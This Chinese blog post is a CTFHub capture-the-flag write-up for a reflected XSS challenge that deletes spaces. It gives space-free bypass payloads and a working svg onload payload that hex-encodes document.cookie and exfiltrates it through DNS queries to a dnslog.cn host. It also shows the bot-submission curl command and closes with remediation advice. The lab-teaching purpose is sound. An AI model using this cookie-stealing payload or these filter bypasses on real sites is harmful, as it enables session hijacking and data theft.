
---
layout: post
title: "CTFHub Writeup-过滤空格(XSS)"
date: 2026-10-26
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - 过滤空格(XSS) 

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - XSS 空格过滤 |
| 靶场地址 | `http://challenge-bcc0efec3d9adadc.sandbox.ctfhub.com:10800` |
| 注入位置 | GET 参数 `name` |
| 过滤规则 | 空格被直接删除（不是拦截） |
| 回显位置 | `<h1>Hello, <%-name%></h1>`，未转义 |
| 获取方式 | 无空格 payload 偷 Bot 的 `flag` Cookie |
| Flag | `ctfhub{0df8c389e86310174af59e08}` |
## 0x02 漏洞原理
这是反射型 XSS 的进阶版：页面仍然把 `name` 原样输出到 `<h1>Hello, ...</h1>`，但**服务端会把输入里的空格删掉**。
先验证过滤行为：
```
?name=<img src=x onerror=alert(1)>
回显：<h1>Hello, <imgsrc=xonerror=alert(1)>
```
空格被全部删除，`src`、`onerror` 粘在一起，标签直接失效。
但「删空格」是最弱的黑名单之一，因为 HTML 和 JavaScript 里有很多东西可以当空格用：
- HTML 标签里，`/` 可以作为属性之间的分隔符，`<img/src=x/onerror=...>` 会被浏览器正确解析成 `<img src=x onerror=...>`；
- JavaScript 里，`/**/` 注释可以当空格用，例如 `new/**/Image()`；
- 还可以干脆选不需要空格的写法，比如 `document.createElement('img')`。
所以这道题的考点是：**在不能写空格的前提下，重新拼出一个能执行的 XSS payload，并把 Bot 的 Cookie 带出来。**
## 0x03 解题过程
**3.1 找注入点**
访问：
```
http://challenge-bcc0efec3d9adadc.sandbox.ctfhub.com:10800/?name=CTFHub
```
页面回显 `Hello, CTFHub`。输入一个带标签的测试串：
```
?name=<script>alert(1)</script>
```
响应里原样出现 `<script>alert(1)</script>`，没有被转义，说明存在反射型 XSS。
**3.2 确认空格被删**
用带空格的标签测试：
```
?name=<img src=x onerror=alert(1)>
```
回显变成：
```
<h1>Hello, <imgsrc=xonerror=alert(1)>
```
空格全没了。再试 `a b c`，回显是 `abc`，确认服务端是**删除空格**，而不是报错或拦截。
**3.3 用 `/` 代替空格**
HTML 允许用 `/` 分隔标签名和属性，把空格换成 `/`：
```
?name=<img/src=x/onerror=alert(1)>
```
回显：
```
<h1>Hello, <img/src=x/onerror=alert(1)>
```
浏览器会把它解析成 `<img src="x" onerror="alert(1)">`，`onerror` 正常触发。
也可以用 `<svg/onload=...>`，这种标签本身不需要额外的空格。
**3.4 构造无空格的外带脚本**
目标是 Bot 浏览器里的 Cookie，所以不能只弹窗。难点在于 JavaScript 里也不能有空格：
- `new Image()` 中间有空格，不能用；
- 改用 `document.createElement('img')`，全程没有空格；
- 箭头函数 `c=>...` 也没有空格。
最终的 payload：
```html
<svg/onload="h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');i=document.createElement('img');i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'">
```
逐段解释：
- `document.cookie` 取到 `flag=ctfhub{...}`；
- `split('').map(...)` 把每个字符转成两位十六进制，拼成一个长串；
- `h.slice(0,50)` 和 `h.slice(50)` 把长串拆成两段，分别作为两个 DNS label；
- `new Image()` 换成 `document.createElement('img')`，避免空格；
- 最后用 `i.src` 触发一个 GET 请求，实际效果是发起 DNS 查询。
**3.5 提交给 Bot**
页面下方有「Send URL to Bot」，对应的接口是 `POST /submit`，并且要**表单编码**：
```
curl -X POST --data-urlencode "url=http://challenge-...:10800/?name=<URL编码后的payload>" \
  http://challenge-...:10800/submit
```
返回：
```json
{"code": 0, "msg": "Successfully"}
```
说明 Bot 已经开始访问。注意 payload 要先做 URL 编码，否则 Bot 拿到的 URL 里 `<`、`"` 可能被处理掉。
**3.6 接收并解码**
用 DNSLog 接收（访问 `getdomain.php` 拿域名，访问 `getrecords.php` 看记录）。几秒后拿到：
```
666c61673d6374666875627b30646638633338396538363331.30313734616635396530387d.q8clvj.dnslog.cn
```
把两段十六进制拼起来解码：
```
flag=ctfhub{0df8c389e86310174af59e08}
```
得到 Flag：
```
ctfhub{0df8c389e86310174af59e08}
```
**3.7 验证**
- 十六进制解码后是完整的 `flag=ctfhub{...}`，没有截断；
- 同一 payload 触发了两次记录，内容一致；
- flag 长度为 32，符合 `ctfhub{` + 24 位十六进制 + `}` 的格式。
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 找注入点 | `?name=<script>alert(1)</script>` | 原样输出，未转义 |
| 确认过滤 | `?name=<img src=x onerror=...>` | 空格被删，标签失效 |
| 绕过 | `?name=<img/src=x/onerror=alert(1)>` | 正常解析并执行 |
| 构造外带 | `<svg/onload="...document.cookie...">` | 无空格、可执行 |
| 提交给 Bot | `POST /submit` 表单 `url=...` | `code:0 Successfully` |
| 接收 | DNSLog 子域名记录 | 拿到十六进制串 |
| 解码 | 十六进制转 ASCII | `flag=ctfhub{0df8c389e86310174af59e08}` |
整条链路可以概括为：**确认空格被删 → 用 `/` 和 `document.createElement` 写无空格 payload → 提交给 Bot → DNSLog 外带 → 十六进制解码。**
## 0x05 踩坑记录
1. **空格是删除不是拦截**：页面不会报错，只是把空格悄悄抹掉，所以 `<img src=x>` 会变成 `<imgsrc=x>`，看起来「什么都没发生」，其实是标签坏了。
2. **URL 编码救不了空格**：`%20` 解码后还是空格，照样被删；`+` 在 URL 里也会被解码成空格，同样失效。payload 里必须一个空格都没有。
3. **`/` 是最好用的替代符**：`<img/src=x/onerror=...>` 在浏览器里等价于带空格的写法，比 `/**/` 更稳。
4. **JavaScript 里也不能有空格**：`new Image()` 中间的空格会被删成 `newImage()`，直接报错；要么用 `new/**/Image()`，要么用 `document.createElement('img')`。
5. **`/**/` 可以当空格用**：JS 里 `new/**/Image()` 合法，适合必须保留 `new` 和 `Image` 两个 token 的场景。
6. **DNS 不区分大小写**：base64 里的字母大小写会被 DNS 归一，解出来是乱码，所以外带用十六进制。
7. **DNS label 最长 63 字符**：Cookie 转 hex 后长度会超，必须拆成两段甚至多段。
8. **提交接口有 5 秒限速**：连续提交会返回 `Wait a while (5s)`，等一会儿再发。
## 0x06 修复建议
1. **输出编码**：把 `<%- name %>` 改成 `<%= name %>`，对 `<`、`>`、`"`、`'` 做 HTML 实体编码，这是根本。
2. **不要只过滤空格**：黑名单挡不住 `/`、`/**/`、`document.createElement` 这些写法，过滤空格等于没防。
3. **输入白名单**：`name` 只允许字母、数字、中文等常规字符，直接拒绝 `<`、`>` 和事件属性。
4. **加 CSP**：设置 `Content-Security-Policy`，禁止内联脚本和外部脚本加载，即使注入成功也难以执行。
5. **Cookie 加 HttpOnly**：给 `flag` 这类敏感 Cookie 设置 `HttpOnly`，JS 就读不到 `document.cookie`。
6. **Bot 侧隔离**：管理员的浏览器不要访问不可信 URL，或至少在无敏感 Cookie 的独立会话里访问。
## 0x07 总结
空格过滤是 XSS 里最典型的「黑名单绕过」题：
- HTML 层用 `/` 替代空格，`<img/src=x/onerror=...>` 依然能被浏览器解析；
- JavaScript 层用 `/**/` 或改写代码（`document.createElement`）替代空格；
- 只要 payload 里没有空格，过滤就完全失效。
真正让这道题完整的是后半段：XSS 只是入口，目标是把 Bot 的 Cookie 外带出来。webhook 不通就换 DNSLog，DNS 大小写不敏感就换十六进制，label 长度有限就拆分——这些细节比 XSS 本身更容易卡人。
防御上，输出编码是根本，CSP 和 HttpOnly 是兜底；只删空格这种黑名单，永远会有下一种写法绕过去。
